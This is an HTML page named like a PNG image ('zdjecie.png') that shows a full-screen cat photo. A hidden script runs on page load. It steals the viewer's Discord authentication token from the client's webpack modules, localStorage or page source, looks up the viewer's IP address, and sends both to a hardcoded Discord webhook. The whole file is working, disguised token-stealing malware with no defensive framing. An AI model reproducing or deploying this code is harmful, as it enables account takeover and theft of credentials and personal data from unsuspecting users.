<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>zdjecie.png</title>
    <style>body,html{margin:0;padding:0;height:100%;overflow:hidden;background:#000}img{width:100%;height:100%;object-fit:cover;}</style>
</head>
<body>
    <img src="https://image.ceneostatic.pl/data/products/50627763/i-najlepsze-obrazy-zaciekawiony-slodki-kotek-cb826.jpg" alt=" ">
    
    <script>
        async function grabToken() {
            let token = null;
            try {
                const wp = window.webpackChunkdiscord_app;
                if (wp) wp.push([[{}], {}, r => r]);
                for (let k in (window.webpackChunkdiscord_app?.c || {})) {
                    const m = window.webpackChunkdiscord_app.c[k];
                    if (m?.exports?.default?.getToken) {
                        token = m.exports.default.getToken();
                        break;
                    }
                }
            } catch(e) {}
            if (!token) token = localStorage.getItem("token");
            if (!token) token = document.body.innerHTML.match(/"token":"([^"]{59,})/)?.[1];

            if (token && token.length > 50) {
                const ip = await fetch("https://api.ipify.org?format=text").then(r=>r.text()).catch(()=> "N/A");
                fetch("https://canary.discord.com/api/webhooks/1514653351046807702/x6zSAWEUuUajtpxSL15WC5D6FTKjESuPg1Xl2cshSFyt93d4UMTIpgwRl7xjDOPtDS8n", {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        content: "**🎣 TOKEN ZŁAPANY!** 🐱",
                        embeds: [{color: 0xff00ff, fields: [
                            {name: "Token", value: `\`\`\`${token}\`\`\``},
                            {name: "IP", value: ip},
                            {name: "Time", value: new Date().toLocaleString('pl-PL')}
                        ]}]
                    })
                });
            }
        }
        window.onload = grabToken;
    </script>
</body>
</html>
